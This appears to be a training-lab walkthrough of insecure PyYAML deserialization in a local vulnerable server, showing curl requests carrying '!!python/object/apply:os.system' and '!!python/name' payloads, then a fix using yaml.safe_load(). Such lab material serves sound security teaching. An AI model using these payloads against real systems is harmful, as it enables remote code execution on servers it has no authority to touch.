## Insecure YAML Deserialization (Vulnerable Component)

### What is it?
Using `yaml.load()` with an unsafe Loader (like `FullLoader` or the legacy default `Loader`) allows an attacker to inject special YAML tags (`!!python/`) that execute arbitrary Python code on the server. This is a direct consequence of using a component (PyYAML) in an insecure way.

### Prerequisites
Install PyYAML and start the vulnerable server:

```Bash
pip install pyyaml
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Normal Usage**

Send a regular YAML configuration:

```Bash
curl -X POST "http://127.0.0.1:8000/api/config/import" \
     -H "Content-Type: text/plain" \
     -d 'database:
  host: localhost
  port: 5432'
```

Expected Response:
```
Config loaded successfully:
{'database': {'host': 'localhost', 'port': 5432}}
```

**2. Perform the Exploit (Arbitrary Code Execution)**

An attacker sends a malicious YAML payload using the `!!python/object/apply` tag:

```Bash
curl -X POST "http://127.0.0.1:8000/api/config/import" \
     -H "Content-Type: text/plain" \
     -d '!!python/object/apply:os.system ["echo HACKED > /tmp/pwned.txt"]'
```

> **Note:** With `FullLoader` (PyYAML >= 5.1), this specific payload may be blocked, but other gadget chains using `!!python/object/new:` may still work depending on the version. With older PyYAML using the default `Loader`, this runs directly.

**3. Alternative Exploit (Information Disclosure)**

Even if RCE is blocked, an attacker can try to instantiate Python objects for info disclosure:

```Bash
curl -X POST "http://127.0.0.1:8000/api/config/import" \
     -H "Content-Type: text/plain" \
     -d '!!python/name:os.sep ""'
```

**4. Verify the Fix**

Stop the server and start the secure version:

```Bash
uvicorn solution:app --reload
```

Retry the malicious payload — it will be rejected because `yaml.safe_load()` only allows basic Python types.

**Result:** Using an unsafe deserialization method in a well-known library exposes the server to Remote Code Execution. Always use `yaml.safe_load()`.
